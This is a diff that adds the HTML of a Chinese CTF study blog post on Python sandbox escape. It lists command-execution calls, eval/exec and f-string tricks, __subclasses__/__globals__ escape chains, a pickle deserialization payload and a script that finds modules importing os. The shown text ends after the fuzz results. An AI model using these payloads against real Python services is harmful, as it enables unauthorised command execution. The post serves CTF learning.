@@ -1,0 +1,948 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="0xCreed" type="application/atom+xml">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="google-site-verification" content="rVyfNQnulCtgdXjqVYGrMUrs740-YJfu_KMgtp6etq0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-loading-bar.min.css?v=1.0.2">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="填填坑">
+<meta name="keywords" content="web,python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python_web学习">
+<meta property="og:url" content="https://0xcreed.jxustctf.top/2020/06/python-web学习/index.html">
+<meta property="og:site_name" content="0xCreed">
+<meta property="og:description" content="填填坑">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/python-web学习/9113969-e5945487b84c3721.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/python-web学习/image-20200701212037508.png">
+<meta property="og:updated_time" content="2021-03-18T11:21:18.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="python_web学习">
+<meta name="twitter:description" content="填填坑">
+<meta name="twitter:image" content="https://0xcreed.jxustctf.top/2020/06/python-web学习/9113969-e5945487b84c3721.png">
+  <link rel="canonical" href="https://0xcreed.jxustctf.top/2020/06/python-web学习/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>python_web学习 | 0xCreed</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	<a href="https://github.com/0xcreed" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0xCreed</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">35</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">4</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">31</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-commonweal">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/404/" rel="section"><i class="fa fa-fw fa-heartbeat"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://0xcreed.jxustctf.top/2020/06/python-web学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0xCreed">
+      <meta itemprop="description" content="Winter is coming">
+      <meta itemprop="image" content="/images/1.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0xCreed">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">python_web学习
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-06-09 16:31:41" itemprop="dateCreated datePublished" datetime="2020-06-09T16:31:41+08:00">2020-06-09</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-18 19:21:18" itemprop="dateModified" datetime="2021-03-18T19:21:18+08:00">2021-03-18</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+        
+      
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/06/python-web学习/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/06/python-web学习/" itemprop="commentCount"></span></a>
+  </span>
+  
+  
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>7.9k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>7 分钟</span>
+            </span>
+          
+            <div class="post-description">填填坑</div>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="1-沙箱逃逸"><a href="#1-沙箱逃逸" class="headerlink" title="1.沙箱逃逸"></a>1.沙箱逃逸</h2><p>Python 的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。测试环境是 <code>python3.8.2</code>,<code>py3.x</code>各个版本间有一些差异，但总体的方法不变。py2就不讨论了</p><ul>
+<li><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a><strong>执行系统命令</strong></h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">"whoami"</span>)</span><br><span class="line">os.popen(<span class="string">"whoami"</span>).read()</span><br><span class="line">subprocess.run(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>) //如果 shell 设为 <span class="literal">True</span>,命令是被Bash(Sh)启动，所以支持shell语法。 如果shell=<span class="literal">False</span>的话，启动的是可执行程序本身，后面的参数不再支持shell语法。</span><br><span class="line">subprocess.Popen(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.call(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">"whoami"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>  执行系统命令只有 <code>os</code> <code>subprocess</code></p>
+</li>
+<li><h4 id="执行Python代码"><a href="#执行Python代码" class="headerlink" title="执行Python代码"></a><strong>执行Python代码</strong></h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(expression[, globals[, locals]]) //实参是一个字符串，以及可选的 globals 和 locals。globals 实参必须是一个字典。locals 可以是任何映射对象。</span><br><span class="line">exec(object[, globals[, locals]])  //这个函数支持动态执行 Python 代码。object 必须是字符串或者代码对象。<span class="keyword">exec</span>函数的返回值永远为<span class="literal">None</span>。</span><br><span class="line">f-string</span><br></pre></td></tr></table></figure>
+
+  <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec('import os <span class="comment">;os.system("whoami")')</span></span><br><span class="line">eval('__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)')</span><br><span class="line">f'&#123;__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)&#125;' //F'&#123;__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)&#125;'</span><br></pre></td></tr></table></figure>
+
+<p>  这两个函数是内置函数。</p>
+<p>  大体上就是 <code>执行python代码 -&gt; 执行系统命令</code></p>
+</li>
+<li><h4 id="关键方法"><a href="#关键方法" class="headerlink" title="关键方法"></a><strong>关键方法</strong></h4></li>
+</ul><a id="more"></a>
+
+<p><code>__init__</code> 类的实例化</p>
+<p><code>__base__</code> 列出其基类。<code>__base__</code> 和 <code>__bases__</code>都是返回当前类的基类，只不过<code>__bases__</code>返回的是一个元祖</p>
+<p><code>__mro__</code> 递归显示其父类直到object</p>
+<p><code>__subclasses__()[]</code> 获取子类</p>
+<p><code>__class__</code> 获得当前对象的类</p>
+<p><code>object.__getattribute__(self, name)</code> 此方法会无条件地被调用以实现对类实例属性的访问。</p>
+<p><code>__globals__</code>   <code>function.__globals__</code> 等同于globals()。dir() 的结果是上面两个的键值</p>
+<p><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()[138].__init__.__getattribute__(&quot;__globals__&quot;)</code>  //<code>os._wrap_close</code>类</p>
+<p><code>__dir__</code> 一个字典或其他类型的映射对象，用于存储对象的（可写）属性。</p>
+<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__dict__[&apos;upper&apos;]
+&lt;method &apos;upper&apos; of &apos;str&apos; objects&gt;
+&gt;&gt;&gt; &apos;&apos;.__class__.upper
+&lt;method &apos;upper&apos; of &apos;str&apos; objects&gt;</code></pre><p><code>__import__</code> <code>import</code>一个模块</p>
+<p><code>bulitins</code>  Python3的内建模块，该内建模块中的功能可以直接使用，不用在其前添加内建模块前缀</p>
+<pre><code>import builtins
+dir(builtins) //打印所有的内联函数可获取eval exec</code></pre><p><code>__builtins__</code> <code>builtins</code> 的引用 <code>__builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)</code></p>
+<p><code>__name__</code> 个值获得的只是一个字符串，不是模块的引用，使用<code>sys.modules[__name__]</code> 才获得的是模块的引用<br>        <code>__call__(self[, args...])</code> 此方法会在实例作为一个函数被“调用”时被调用；如果定义了此方法，则 <code>x(arg1, arg2, ...)</code> 就相当于 <code>x.__call__(arg1, arg2, ...)</code></p>
+<p><code>().__class__.__bases__[0].__subclasses__()[37].__call__(exec,&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></p>
+<p><code>dir()</code> 将显示对象的属性的名称，<code>__dict__</code>是dir()的子集。注意<a href="https://docs.python.org/zh-cn/3/library/functions.html#dir" target="_blank" rel="noopener"><code>dir()</code></a> 不会列出内置函数和变量的名称</p>
+<p><code>getattr(object, name[, default])</code>  返回对象命名属性的值。<em>name</em> 必须是字符串。如果该字符串是对象的属性之一，则返回该属性的值。例如， <code>getattr(x, &#39;foobar&#39;)</code> 等同于 <code>x.foobar</code> 可以用这个特性绕过 <code>.</code> 被过滤的情况</p>
+<p><code>pickle</code> 这个是python 的一个序列化的方法，用于将对象存储在字符串对象中，实现对象的持久化。</p>
+<p>​     <code>pickle.loads(b&quot;cos\nsystem\n(S&#39;ls&#39;\ntR.&quot;) //执行命令</code></p>
+<p><code>timeit模块</code> 测试代码的执行时间的<br>            <code>timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;,number=1)</code></p>
+<p><code>importlib模块</code> </p>
+<p>​    <code>find_loader</code>用来查找模块，<code>reload</code>重新载入模块<code>importlib.import_module(name, package=None)</code>充当<code>importlib.__import__()</code>的简化包装。</p>
+<ul>
+<li><h4 id="import-导入机制"><a href="#import-导入机制" class="headerlink" title="import 导入机制"></a>import 导入机制</h4><p>  <img src="/2020/06/python-web学习/9113969-e5945487b84c3721.png" alt="9113969-e5945487b84c3721"></p>
+</li>
+</ul>
+<p>所以说如果导入的模块a中有着另一个模块b，那么，我们可以用a.b的方法或者<code>a.__dict__[b&lt;name&gt;]</code>的方法间接访问模块b。</p>
+<p>顺着这个思路，我们可以FUZZ一下哪些模块 <code>import</code> <code>os</code>和<code>subprocess</code>从而执行系统命令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询手册合成的标准库字典</span></span><br><span class="line"><span class="comment">#第三方库也是同样fuzz的</span></span><br><span class="line">all_modules3=[<span class="string">'string'</span>, <span class="string">'re'</span>, <span class="string">'difflib'</span>, <span class="string">'textwrap'</span>, <span class="string">'unicodedata'</span>, <span class="string">'stringprep'</span>, <span class="string">'readline'</span>, <span class="string">'rlcompleter'</span>, <span class="string">'struct'</span>, <span class="string">'codecs'</span>, <span class="string">'datetime'</span>, <span class="string">'calendar'</span>, <span class="string">'collections'</span>, <span class="string">'heapq'</span>, <span class="string">'bisect'</span>, <span class="string">'array'</span>, <span class="string">'weakref'</span>, <span class="string">'types'</span>, <span class="string">'copy'</span>, <span class="string">'pprint'</span>, <span class="string">'reprlib'</span>, <span class="string">'enum'</span>, <span class="string">'numbers'</span>, <span class="string">'math'</span>, <span class="string">'cmath'</span>, <span class="string">'decimal'</span>, <span class="string">'fractions'</span>, <span class="string">'random'</span>, <span class="string">'statistics'</span>, <span class="string">'itertools'</span>, <span class="string">'functools'</span>, <span class="string">'operator'</span>, <span class="string">'pathlib'</span>, <span class="string">'fileinput'</span>, <span class="string">'stat'</span>, <span class="string">'filecmp'</span>, <span class="string">'tempfile'</span>, <span class="string">'glob'</span>, <span class="string">'fnmatch'</span>, <span class="string">'linecache'</span>, <span class="string">'shutil'</span>, <span class="string">'pickle'</span>, <span class="string">'copyreg'</span>, <span class="string">'shelve'</span>, <span class="string">'marshal'</span>, <span class="string">'dbm'</span>, <span class="string">'sqlite3'</span>, <span class="string">'zlib'</span>, <span class="string">'gzip'</span>, <span class="string">'bz2'</span>, <span class="string">'lzma'</span>, <span class="string">'zipfile'</span>, <span class="string">'tarfile'</span>, <span class="string">'csv'</span>, <span class="string">'configparser'</span>, <span class="string">'netrc'</span>, <span class="string">'xdrlib'</span>, <span class="string">'plistlib'</span>, <span class="string">'hashlib'</span>, <span class="string">'hmac'</span>, <span class="string">'secrets'</span>, <span class="string">'os'</span>, <span class="string">'io'</span>, <span class="string">'time'</span>, <span class="string">'argparse'</span>, <span class="string">'getopt'</span>, <span class="string">'logging'</span>, <span class="string">'getpass'</span>, <span class="string">'curses'</span>, <span class="string">'platform'</span>, <span class="string">'errno'</span>, <span class="string">'ctypes'</span>, <span class="string">'threading'</span>, <span class="string">'multiprocessing'</span>, <span class="string">'concurrent'</span>, <span class="string">'subprocess'</span>, <span class="string">'sched'</span>, <span class="string">'queue'</span>, <span class="string">'_thread'</span>, <span class="string">'_dummy_thread'</span>, <span class="string">'dummy_threading'</span>, <span class="string">'contextvars'</span>, <span class="string">'asyncio'</span>, <span class="string">'socket'</span>, <span class="string">'ssl'</span>, <span class="string">'select'</span>, <span class="string">'selectors'</span>, <span class="string">'asyncore'</span>, <span class="string">'asynchat'</span>, <span class="string">'signal'</span>, <span class="string">'mmap'</span>, <span class="string">'email'</span>, <span class="string">'json'</span>, <span class="string">'mailcap'</span>, <span class="string">'mailbox'</span>, <span class="string">'mimetypes'</span>, <span class="string">'base64'</span>, <span class="string">'binhex'</span>, <span class="string">'binascii'</span>, <span class="string">'quopri'</span>, <span class="string">'uu'</span>, <span class="string">'xml'</span>, <span class="string">'webbrowser'</span>, <span class="string">'cgi'</span>, <span class="string">'cgitb'</span>, <span class="string">'wsgiref'</span>, <span class="string">'urllib'</span>, <span class="string">'http'</span>, <span class="string">'ftplib'</span>, <span class="string">'poplib'</span>, <span class="string">'imaplib'</span>, <span class="string">'nntplib'</span>, <span class="string">'smtplib'</span>, <span class="string">'smtpd'</span>, <span class="string">'telnetlib'</span>, <span class="string">'uuid'</span>, <span class="string">'socketserver'</span>, <span class="string">'xmlrpc'</span>, <span class="string">'ipaddress'</span>, <span class="string">'audioop'</span>, <span class="string">'aifc'</span>, <span class="string">'sunau'</span>, <span class="string">'wave'</span>, <span class="string">'chunk'</span>, <span class="string">'colorsys'</span>, <span class="string">'imghdr'</span>, <span class="string">'sndhdr'</span>, <span class="string">'ossaudiodev'</span>, <span class="string">'gettext'</span>, <span class="string">'locale'</span>, <span class="string">'turtle'</span>, <span class="string">'cmd'</span>, <span class="string">'shlex'</span>, <span class="string">'tkinter'</span>, <span class="string">'typing'</span>, <span class="string">'pydoc'</span>, <span class="string">'doctest'</span>, <span class="string">'unittest'</span>, <span class="string">'2to3'</span>, <span class="string">'test'</span>, <span class="string">'bdb'</span>, <span class="string">'faulthandler'</span>, <span class="string">'pdb'</span>, <span class="string">'timeit'</span>, <span class="string">'trace'</span>, <span class="string">'tracemalloc'</span>, <span class="string">'distutils'</span>, <span class="string">'ensurepip'</span>, <span class="string">'venv'</span>, <span class="string">'zipapp'</span>, <span class="string">'sys'</span>, <span class="string">'sysconfig'</span>, <span class="string">'builtins'</span>, <span class="string">'__main__'</span>, <span class="string">'warnings'</span>, <span class="string">'dataclasses'</span>, <span class="string">'contextlib'</span>, <span class="string">'abc'</span>, <span class="string">'atexit'</span>, <span class="string">'traceback'</span>, <span class="string">'__future__'</span>, <span class="string">'gc'</span>, <span class="string">'inspect'</span>, <span class="string">'site'</span>, <span class="string">'code'</span>, <span class="string">'codeop'</span>, <span class="string">'zipimport'</span>, <span class="string">'pkgutil'</span>, <span class="string">'modulefinder'</span>, <span class="string">'runpy'</span>, <span class="string">'importlib'</span>, <span class="string">'parser'</span>, <span class="string">'ast'</span>, <span class="string">'symtable'</span>, <span class="string">'symbol'</span>, <span class="string">'token'</span>, <span class="string">'keyword'</span>, <span class="string">'tokenize'</span>, <span class="string">'tabnanny'</span>, <span class="string">'pyclbr'</span>, <span class="string">'py_compile'</span>, <span class="string">'compileall'</span>, <span class="string">'dis'</span>, <span class="string">'pickletools'</span>, <span class="string">'formatter'</span>, <span class="string">'msilib'</span>, <span class="string">'msvcrt'</span>, <span class="string">'winreg'</span>, <span class="string">'winsound'</span>, <span class="string">'posix'</span>, <span class="string">'pwd'</span>, <span class="string">'spwd'</span>, <span class="string">'grp'</span>, <span class="string">'crypt'</span>, <span class="string">'termios'</span>, <span class="string">'tty'</span>, <span class="string">'pty'</span>, <span class="string">'fcntl'</span>, <span class="string">'pipes'</span>, <span class="string">'resource'</span>, <span class="string">'nis'</span>, <span class="string">'_frozen_importlib'</span>, <span class="string">'_imp'</span>, <span class="string">'_warnings'</span>, <span class="string">'_frozen_importlib_external'</span>, <span class="string">'_io'</span>, <span class="string">'nt'</span>, <span class="string">'_weakref'</span>, <span class="string">'_codecs'</span>, <span class="string">'encodings.aliases'</span>, <span class="string">'encodings'</span>, <span class="string">'encodings.utf_8'</span>, <span class="string">'_signal'</span>, <span class="string">'encodings.latin_1'</span>, <span class="string">'_abc'</span>, <span class="string">'_stat'</span>, <span class="string">'_collections_abc'</span>, <span class="string">'genericpath'</span>, <span class="string">'ntpath'</span>, <span class="string">'os.path'</span>, <span class="string">'_site'</span>]</span><br><span class="line"></span><br><span class="line">methods = [<span class="string">'os'</span>,<span class="string">'subprocess'</span>] <span class="comment"># sys __import__ __builtins__ </span></span><br><span class="line">res = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line">    res[met] = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> module <span class="keyword">in</span> all_modules3:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            m = __import__(module)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        attrs = dir(m)</span><br><span class="line">        <span class="keyword">if</span> met <span class="keyword">in</span> attrs:</span><br><span class="line">            res[met].append(module)</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line">    print(met+<span class="string">":"</span>+str(res[met]))</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">os</span>:<span class="selector-attr">[<span class="string">'pathlib'</span>, <span class="string">'fileinput'</span>, <span class="string">'filecmp'</span>, <span class="string">'glob'</span>, <span class="string">'fnmatch'</span>, <span class="string">'linecache'</span>, <span class="string">'shutil'</span>, <span class="string">'dbm'</span>, <span class="string">'gzip'</span>, <span class="string">'bz2'</span>, <span class="string">'lzma'</span>, <span class="string">'zipfile'</span>, <span class="string">'tarfile'</span>, <span class="string">'configparser'</span>, <span class="string">'netrc'</span>, <span class="string">'plistlib'</span>, <span class="string">'secrets'</span>, <span class="string">'getopt'</span>, <span class="string">'logging'</span>, <span class="string">'getpass'</span>, <span class="string">'curses'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'socket'</span>, <span class="string">'ssl'</span>, <span class="string">'asyncore'</span>, <span class="string">'mailcap'</span>, <span class="string">'mailbox'</span>, <span class="string">'mimetypes'</span>, <span class="string">'binhex'</span>, <span class="string">'uu'</span>, <span class="string">'webbrowser'</span>, <span class="string">'cgi'</span>, <span class="string">'cgitb'</span>, <span class="string">'smtpd'</span>, <span class="string">'uuid'</span>, <span class="string">'socketserver'</span>, <span class="string">'gettext'</span>, <span class="string">'shlex'</span>, <span class="string">'pydoc'</span>, <span class="string">'doctest'</span>, <span class="string">'bdb'</span>, <span class="string">'pdb'</span>, <span class="string">'trace'</span>, <span class="string">'tracemalloc'</span>, <span class="string">'ensurepip'</span>, <span class="string">'venv'</span>, <span class="string">'zipapp'</span>, <span class="string">'sysconfig'</span>, <span class="string">'inspect'</span>, <span class="string">'site'</span>, <span class="string">'pkgutil'</span>, <span class="string">'modulefinder'</span>, <span class="string">'tabnanny'</span>, <span class="string">'py_compile'</span>, <span class="string">'compileall'</span>, <span class="string">'msilib'</span>, <span class="string">'pipes'</span>, <span class="string">'resource'</span>, <span class="string">'nis'</span>, <span class="string">'genericpath'</span>, <span class="string">'ntpath'</span>]</span></span><br><span class="line"><span class="selector-tag">subprocess</span>:<span class="selector-attr">[<span class="string">'asyncio'</span>, <span class="string">'webbrowser'</span>, <span class="string">'imaplib'</span>, <span class="string">'venv'</span>]</span></span><br></pre></td></tr></table></figure>
+
